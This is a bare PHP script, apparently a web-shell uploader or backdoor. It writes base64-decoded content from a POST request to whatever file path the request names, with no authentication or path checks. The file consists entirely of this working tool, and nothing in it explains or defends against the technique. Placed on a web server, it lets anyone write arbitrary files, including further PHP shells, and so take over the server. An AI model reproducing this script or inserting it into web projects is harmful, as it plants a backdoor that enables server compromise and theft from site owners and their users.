<?PHP
echo file_put_contents($_POST['filename'],base64_decode($_POST['content']));
?>